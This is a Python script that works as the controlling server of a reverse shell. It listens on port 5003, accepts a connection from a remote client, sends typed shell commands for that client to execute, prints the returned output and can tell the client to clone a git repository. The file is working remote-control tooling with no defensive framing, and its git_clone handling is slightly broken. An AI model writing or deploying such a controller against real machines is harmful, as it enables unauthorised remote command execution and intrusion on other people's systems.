import socket


#CREATION OF SOCKET

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()


#BINDING OF SOCKET

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")


#ACCEPTING CONNECTIONS
# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

#FIRST INTERACTION WITH CLIENT
# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

def send_git_clone_command(s, repo):
    # the git_clone command
    command = f"git_clone {repo}"
    try:
        # send the git_clone command to the client
        s.send(command.encode())
        # receive the response from the client
        response = s.recv(BUFFER_SIZE).decode()
        print(f"Response: {response}")
    except socket.error as e:
        print(f"Socket error: {str(e)}")

#INTERACTION WITH CLIENT
while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if command.lower() == "git_clone":
        # if git_clone command was issued, send the repo name
        send_git_clone_command(client_socket, "\n".join(command.split()[1:]))
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
